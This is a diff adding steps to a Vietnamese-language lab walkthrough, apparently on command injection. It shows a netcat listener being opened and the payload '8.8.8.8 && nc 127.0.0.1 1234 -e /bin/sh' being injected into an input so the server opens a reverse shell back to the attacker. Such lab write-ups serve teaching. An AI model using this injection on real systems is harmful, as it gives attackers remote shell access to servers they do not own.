@@ -145,3 +145,20 @@
 
    ![image](https://user-images.githubusercontent.com/101852647/168753366-936ebc40-beb8-4eaa-9b11-6d12bd4276ca.png)
 
+ - Bây giờ chúng ta sẽ thực hiện reverse shell. Đầu tiên chúng ta sử dụng lệnh ` nc -lvnp 1234` để mở trình lắng nghe cho các kết nối:
+
+   ![image](https://user-images.githubusercontent.com/101852647/168758609-76e603b5-9150-46f2-bc77-8346ad1666f8.png)
+   
+ - Tiếp theo chúng ta sử dụng lệnh `netstat -tunpl `để :
+
+   ![image](https://user-images.githubusercontent.com/101852647/168759055-859aaa02-53b5-4553-b052-9fb47f4eb6ef.png)
+
+ - Sau đó chúng ta sẽ sử dụng lệnh `ip a` để :
+
+  ![image](https://user-images.githubusercontent.com/101852647/168759247-b45d025b-826e-4359-8e70-d5915b3b9d22.png)
+
+ - Bây giờ chúng ta sẽ thử lệnh `8.8.8.8 && nc 127.0.0.1 1234 -e /bin/sh ` để tạo một trình bao trên máy chủ và kết nối ngược lại với máy chúng ta:
+
+   ![image](https://user-images.githubusercontent.com/101852647/168760822-0a14488c-0e86-4143-91b1-7f595d0b1681.png)
+
+
